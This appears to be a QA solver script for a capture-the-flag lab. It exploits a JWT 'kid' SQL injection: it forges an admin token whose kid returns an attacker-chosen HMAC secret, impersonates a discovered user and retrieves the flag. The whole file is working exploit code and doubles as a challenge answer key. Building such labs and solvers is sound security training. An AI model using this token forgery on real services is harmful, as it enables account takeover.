#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/kid-injection (KidInjection).
 *
 * Intended path: log in as a tester → discover the innocent account via
 * GET /api/directory → forge an HS256 token whose header kid is a SQL
 * injection. The verifier (vuln.js) builds the key lookup by string
 * concatenation:
 *     SELECT key FROM signing_keys WHERE kid = '<header.kid>'
 * A kid of `' UNION SELECT 'known-secret'-- ` makes the lookup return our
 * chosen secret, and jwt.verify then runs HS256 with it. Sign the gated
 * claim pair (sub=<innocent>, role=admin) with 'known-secret' and claim the
 * flag at GET /flag/jwt.
 *
 * Env: LAB (default http://localhost:8119). Vhosts via the Host header.
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-KidInjection-\d+\}/ flag.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const FLAG_RE = /^DSLTV\{JWT-KidInjection-\d+\}$/;
const PROFILE = 'dsltv-jwt-kid-injection';

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

const CHOSEN_SECRET = 'known-secret';
/* injected SQL (source: vuln.js verifyToken):
 *   SELECT key FROM signing_keys WHERE kid = '' UNION SELECT 'known-secret'-- ' */
const KID_Sqli = `' UNION SELECT '${CHOSEN_SECRET}'-- `;

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester — legit tokens use kid=legacy-2023 */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok(`logged in as 0xnhsec (server token kid=${lj.kid})`);

  /* 2. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 3. forge: HS256, header kid = SQLi, HMAC secret = the chosen string */
  const header = { alg: 'HS256', typ: 'JWT', kid: KID_Sqli };
  const payload = { sub: innocent.username, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const h = b64u(header), p = b64u(payload);
  const sig = crypto.createHmac('sha256', CHOSEN_SECRET).update(`${h}.${p}`).digest('base64url');
  const forged = `${h}.${p}.${sig}`;
  ok(`forged token with SQLi kid (lookup returns our secret "${CHOSEN_SECRET}")`);

  /* 4. claim the flag */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the forged token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
